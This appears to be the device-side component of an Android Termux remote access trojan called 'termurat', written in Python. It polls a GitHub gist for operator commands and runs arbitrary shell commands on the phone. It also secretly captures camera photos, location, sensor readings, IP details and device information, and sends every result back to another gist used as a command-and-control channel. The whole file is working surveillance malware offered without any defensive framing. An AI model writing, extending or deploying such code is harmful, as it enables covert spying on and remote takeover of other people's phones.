import time, sys, os, signal
from subprocess import getoutput as output
from subprocess import run
from requirements_for_target import *
import requests
import json





# Clear screen
run("clear", shell=True)
separator = "__#SEPARATOR#__"

# Check requirements


# Load data.json
with open("data.json") as file:
    data = json.load(file)

if not data.get("to_target_gist_id") or not data.get("to_host_gist_id"):
    print("data.json is corrupted.")
    sys.exit()

run("clear", shell=True)


# Ensure last_connection_time file exists
if not os.path.exists("last_connection_time"):
    with open("last_connection_time", "w") as file:
        file.write(time.strftime("%d-%m-%Y_%H:%M:%S"))

dev_inf = str(output("termux-info --no-set-clipboard"))
dev_inf = dev_inf.split("Device manufacturer:\n")[1]
dev_inf = dev_inf.split("\nSupported ABIs:")[0]
dev_inf = "-".join(dev_inf.split("\nDevice model:\n"))

pwd = "/data/data/com.termux/files/home"

while True:
    img_str = ""
    time.sleep(1)
    with open("last_connection_time") as file:
        last_received_time = file.read()
    deviceinfo = json.loads(output("termux-telephony-deviceinfo"))
    if deviceinfo.get("data_state") != "connected":
        continue

    
    host_data = json.loads(read_gist(data["to_target_gist_id"]))
    
    if host_data.get("time") == last_received_time:
        continue

    with open("last_connection_time", "w") as file:
        file.write(host_data["time"])

    command = host_data.get("command", "")

    if command == "termux-location":
        out = output(f"cd {pwd} && timeout 30 {command} && pwd")
        if not out:
            out = "Timeout. May be caused because the required conditions were not fulfilled."
        else:
            out = out.split("\n")
            pwd = out.pop(-1)
            out = "\n".join(out)
    elif command == "termurat exit":
        edit_gist(data["to_host_gist_id"], "to_host.json", json.dumps({
            "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
            "pwd": pwd,
            "deviceinfo": dev_inf,
            "command": command,
            "info": "Done"
        }))
        time.sleep(5)
        parent_pid = os.getppid()
        os.kill(parent_pid, signal.SIGHUP)
        
    elif command == "termurat ipinfo":
        out = requests.get("https://ipinfo.io/").text
       
    elif command == "termux-sensors":
        out = output(f"cd {pwd} && timeout 30 termux-sensors -a -n 1 && pwd")
        out = out.split("\n")
        pwd = out.pop(-1)
        out = "\n".join(out)

    elif "termux-camera-photo" in command:
        run(f"cd {pwd} && {command} temp.jpg", shell=True)
        if os.path.exists(f"{pwd}/temp.jpg"):
            out=upload_image(f"{pwd}/temp.jpg")
        else:
            out = "Failed to capture image."
        run(f"cd {pwd} && rm temp.jpg", shell=True)
        

        edit_gist(data["to_host_gist_id"], "to_host.json", json.dumps({
        "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
        "pwd": pwd,
        "deviceinfo": dev_inf,
        "command": command,
        "info": out
    }))
        continue
    else:
        out = output(f"cd {pwd} && {command} && echo {separator} && pwd")
        out = out.split(f"{separator}\n")
        if len(out) != 1:
            pwd = out.pop(-1)
        out = "\n".join(out)
        if not out: 
            out = "Done"

    edit_gist(data["to_host_gist_id"], "to_host.json", json.dumps({
        "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
        "pwd": pwd,
        "deviceinfo": dev_inf,
        "command": command,
        "info": out
    }))